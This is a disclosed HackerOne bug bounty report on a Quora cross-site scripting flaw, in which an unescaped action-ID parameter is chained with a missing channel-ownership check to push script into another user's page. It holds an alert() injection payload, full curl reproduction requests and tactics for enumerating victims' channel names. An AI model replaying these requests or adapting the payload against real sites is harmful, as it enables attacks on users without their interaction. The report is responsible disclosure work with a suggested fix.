# XSS through `__e2e_action_id` delivered by JSONP

## Report Details
- **Report ID**: 259100
- **URL**: https://hackerone.com/reports/259100
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-08-11T21:09:40.457Z
- **Disclosed**: 2018-03-08T18:54:18.108Z

## Reporter
- **Username**: 0xnan
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: quora

## Vulnerability Information
#Summary:

The `__e2e_action_id` params used with POST requests to `/server_call_POST?_m=*` endpoint is not properly escaped when reflected back on a response allowing to inject Javascript.
Also, another issue on some methods (such as `/server_call_POST?_m=edit`) allows - with a *strong* premise discussed on the description - *any* authenticated user to deliver the vulnerability to another user without any interaction.

# Description

## XXS
On the Web Application http://www.quora.com most user actions are performed as POST on `/server_call_POST?_m=*`, implementing AJAX architecture.
On the client side these requests are processed by  `./shared/core/rpc.js` library that in turns uses the library `./actions.js` to define "actions" which have an ID `__e2e_action_id` and some methods such as startAction() and **finishAction(id, ...)**.  
The `__e2e_eaction_id` is generated for every request with `id = (1e3 * e.startTime + Math.floor(1e3 * Math.random())).toString(36)` so its value is intended to be composed by [0-9a-z].

When a user performs an action, this ID is embedded on the POST request and with some methods (for
example `/server_call_POST?_m=load_menu`) its content is reflected back as first argument of
finishAction().  For example a "normal" call, with `__e2e_action_id=esko02tjqe` is the following (I've omitted most headers/params/data):

```
curl 'https://www.quora.com/webnode2/server_call_POST?_v=####&_m=load_menu'  
-data 'json=...&__e2e_action_id=esko02tjqe&...'

> POST /webnode2/server_call_POST?_v=█████&_m=load_menu HTTP/1.1
> Host: www.quora.com
> Cookie: █████████████████████
...
< HTTP/1.1 200 OK
< Content-Type: application/json; charset=utf-8
< Server: nginx
< 
{"value": {
     "html": ..., 
      "css": .......,                             (↓↓↓↓↓↓ reflected ID)
       "js": "require('actions').finishAction('esko02tjqe', {\"controller\": \"webnode2\", \"action\": \"server_call_POST\", \"standard\": {}, \"serverTime\": 34511, \"mustReport\": true});\n            var webnode = require('shared/core/webnode');\n   ....     "}, 
   "pmsg": null}
```
Since no escaping is performed, it is possible to inject code, for example setting `__e2e_action_id=',alert(),'` which will produce:
```
...
 "js": "require('actions').finishAction('',alert(),'', {\"cont... "}, 
...
```
creating a valid js section that execute `alert()`.
Fortunately this vulnerability can't be triggered as it is because this would require the malformed request to be sent by Quora.com since it is `./shared/core/rpc.js` that execute the response (that has a content type of `application/json`) and seems that there is no way to directly set the `__e2e_action_id` on a session of Quora (a new one is generated  for each action).

## Deliver the XSS using JSONP

I've noticed another "vulnerability" that can be chained with the aforementioned to be able to effectively
deliver the XSS to an user.
When an user is on Quora, to its page is associated a "channel" (I hope this is the correct name) such as `main-w-dep3105-32490323....` and there is always a request that try to fetch new "update" from a
channel (restarted each time it returns).  
This request is `update` on *.tch.quora.com, for example:

```
REQUEST
https://tch969298.tch.quora.com/up/chan43-8888/updates?&callback=jsonp<callback_name>&channel=main-w-dep3105-32490323....&hash=16762940...

POSSIBLE RESPONSE:
jsonp<callback_name>({"messages":["require.whenReady(\"main\", function() {\n ... ,"min_seq":1591113381})
```

The action `/server_call_POST?_m=edit` (used for example when an user change its profile description), do not behave like `/server_call_POST?_m=load_menu` (described in the first section). What I mean is that they do not reply with the response `{"value": {"html": ..., "css": ...., "js": ...}, "pmsg": ""}` to update the page but they reply with a response `{"value": null, "pmsg": null}` and *deliver the update through a message on the channel of the user*.

For example after a `/server_call_POST?_m=edit` with `__e2e_action_id=eskrisktsq` the `/update?` request reply with:
```
jsonp<callback_name>({"messages":["require.whenReady(\"main\", function()
 {require('actions').finishAction('eskrisktsq' ... <other data of the edit action>
                                     ↑↑↑↑↑
             (__e2e_action_id of the _m=edit call reflected)
     
```
on which `eskrisktsq` is the `__e2e_action_id` used on the `_m=edit` call vulnerable to XSS.
The fact that `_m=edit` sent a message to the channel `main-w-dep3105-32490323....` it's because this channel is specified as parameter on the request `_m=edit`:
```
curl 'https://www.quora.com/webnode2/server_call_POST?_v=███████&_m=edit' 
--data 'json={
"args":[],"kwargs":{the data of the edit}}&
revision=███████████&
formkey=███████████&
postkey=███████████&
window_id=dep3105-32490323....&                          ← specified here
_lm_window_id=dep3105-32490323....&                      ←   and here
__e2e_action_id=eskrisktsq&
&__vcon_json=[█████]&.....' 
```

The real problem is that this method **do not check if the specified channel is associated to user session who performed the call**. So what could happen is that the attacker can send the XSS to
a specified channel name that will be triggered as soon as the `update?` request (of the victim user) receives the evil data, without any interaction of the victim.
The *effect* of `_m=edit` (eg: change the profile description) is applied to the Attacker profile (since on the request are used Cookies, formkey and postkey of the Attacker) but *the finishAction() message* (vulnerable to XSS) is sent to the *victim* channel name.

I can confirm that this behavior is not present on other methods: for example with `_m=load_menu` if you try to change the `window_id` you obtain a 500 Internal Server Error, this should demonstrate that there is some check missing on methods such as `_m=edit`.  
I've not tested other methods, anyway I think that all the methods that reply with `{"value": null, "pmsg": null}` are vulnerable but not the ones that reply with the update directly (as `_m=load_menu` does) .

The *strong* premise said on the summary is that an attacker should know the victim channel_name and, that seems not easy to obtain, but if there are ways to do this, this vulnerability will become a serious problem since no victim interaction is required to perform the attack.

Anyway is still possible to do a bruteforce on channel name spreading the attack on random users. To this end I want to call on your attention some pro/cons aspect for the attacker:

   0. There could be easy ways that I did not find to leak valid channel_name
   1. The attack can't be stopped from browser XSS filters
   2. The XSS seems to work only on Quora.com (Android do not use `__e2e_action_id`, IOs not tested)
   3. A channel_name is composed of `dep<4 digit[0-9]>-<up to 19 digit[0-9]>`. Valid 4 digits for `dep`
 can be leaked using `https://www.quora.com/check_livedeps/index?window_id=dep3304-`
  that seems to respond with "ok" if the 4 digits (in this case 3304) are part of a channel alive.
   4. the remaining part is infeasible to enumerate (10^19), but should be noted that:
     -  doing the evil request returns an HTTP status code 200, so the attack can be distributed on multiple Attacker's Quora Profiles created for the attack, and metrics such as increased error rate (http 500) do not highlight any attack.
     - if the XSS is sent to a channel_name that is not used by any user and Quora assigns this
       channel_name, up to 5minutes **later** the evil request was sent, the XSS is delivered correctly.
       (BTW I do not know if Quora would assign a channel name on which a message is already "pending")
     -I think the attacker can keep busy some channels name (reducing the space to enumerate),
logging and executing the same code that Quora uses to attach a channel to an user, e.g:   

````
 require("tchannel_up").start(0, "main-w-dep3104-34040...", "2287....", "chan42-8888", "quora.com", "");

or simply a repeated GET on:

https://tch969298.tch.quora.com/up/chan42-8888/updates?&callback=jsonp<callback_name>&channel=main-w-dep3104-34040...&hash=2287....
```` 
since seems that there isn't a limit on how much "active" channel are reserved for a user session (I've not tried extensively, but i've executed 3 time the code with channel saved from past session - since you need the `hash` params - and works).


### Steps To Reproduce

I describe the steps using browser Chromium, but it is not stricly necessary

1. Attacker log in on Quora.com and goes on its profile page 
2. Attacker open developer tools of its browser and goes on the "Network" tab
3. Attacker update its profile description using dummy data and copy the request performed on `server_call_POST?_m=edit`, eg:
    
    ```curl 'https://www.quora.com/webnode2/server_call_POST?_v=2rtUq6Z4HO9gWK&_m=edit' -H 'Cookie: m-b="██████████████████"; m-sa=1; m-s="███████████████"; m-screen_size=1920x1080; m-login=1; m-ju=███████████████████████████; m-early_v=4e4c117b82baf40e; m-tz=-120; m-css_v=69026465bc2615b6; m-wf-loaded=q-icons-q_serif; _ga=GA1.2.2058437224.1502195915; _gid=GA1.2.1848940326.1502195915' -H 'Origin: https://www.quora.com' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Referer: https://www.quora.com/profile/Aleph-NaN' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' -H 'DNT: 1' --data 'json={"args":[],"kwargs":{"id":███████████,"input":{"sections":[{"type":"plain","indent":0,"quoted":false,"spans":[{"modifiers":{},"text":"a"}]}],"caret":{"start":{"spanIdx":0,"sectionIdx":0,"offset":1},"end":{"spanIdx":0,"sectionIdx":0,"offset":1}}}}}&revision=904d048187b642341464067b64246119b8ce9489&formkey=6a34c75ed7fda8439ca2407b4520c974&postkey=736f2eea9e3826808823625bf4ede215&window_id=dep3204-1727465467565139446&referring_controller=user&referring_action=profile&_lm_transaction_id=0.7159021828610441&_lm_window_id=dep3204-1727465467565139446&__vcon_json=["2rtUq6Z4HO9gWK"]&__vcon_method=edit&__e2e_action_id=esl2xq4xyj&js_init={"id":████████████,"input":"user_description_text","typing_area":null,"draft_space":null,"unsaved_content_msg":"Your content has not been saved.","focus_onload":false,"is_qtext":true,"require_comment":false,"require_value":false,"content_type":null,"submit_text":"Update","show_editor":false}&__metadata={}' --compressed ```
4. the attacker obtain the victim channel name, eg: `dep3501-3261853912009855464`
5. the attacker modify its previusly copied request, setting the `window_id` and `_lm_window_id` parameters to the victim channel name
6. the attacker modify the request, setting the `__e2e_action_id` parameter to inject its javascript payload, for example to `',alert(1),'`, eg: 
    ```curl 'https://www.quora.com/webnode2/server_call_POST?_v=2rtUq6Z4HO9gWK&_m=edit' -H 'Cookie: m-b="██████████████"; m-sa=1; m-s="█████████████████"; m-screen_size=1920x1080; m-login=1; m-ju=███████████████████████████████████████; m-early_v=4e4c117b82baf40e; m-tz=-120; m-css_v=69026465bc2615b6; m-wf-loaded=q-icons-q_serif; _ga=GA1.2.2058437224.1502195915; _gid=GA1.2.1848940326.1502195915' -H 'Origin: https://www.quora.com' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Referer: https://www.quora.com/profile/████' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' -H 'DNT: 1' --data 'json={"args":[],"kwargs":{"id":█████████,"input":{"sections":[{"type":"plain","indent":0,"quoted":false,"spans":[{"modifiers":{},"text":"a"}]}],"caret":{"start":{"spanIdx":0,"sectionIdx":0,"offset":1},"end":{"spanIdx":0,"sectionIdx":0,"offset":1}}}}}&revision=904d048187b642341464067b64246119b8ce9489&formkey=6a34c75ed7fda8439ca2407b4520c974&postkey=736f2eea9e3826808823625bf4ede215&window_id=dep3501-3261853912009855464&referring_controller=user&referring_action=profile&_lm_transaction_id=0.7159021828610441&_lm_window_id=dep3501-3261853912009855464&__vcon_json=["2rtUq6Z4HO9gWK"]&__vcon_method=edit&__e2e_action_id=\',alert(1),\'&js_init={"id":████████,"input":"user_description_text","typing_area":null,"draft_space":null,"unsaved_content_msg":"Your content has not been saved.","focus_onload":false,"is_qtext":true,"require_comment":false,"require_value":false,"content_type":null,"submit_text":"Update","show_editor":false}&__metadata={}' --compressed ```
7. the attacker send the request
8. on the victim page will be executed `alert(1)`

Notice that the cookie, postkey, formkey and other data are of the attacker session.

### Enviroment
Tools used: `curl` and `chromium`

### Suggested fix
- correctly escape `__e2e_action_id`
- do not allow to specify a channel name (`window_id` parameter) that is not "attached" to the session of the caller


I can provide a demonstrating video if required or other info. 
The severity was calculated with the Hackerone Calculator.

## Attachments
No attachments
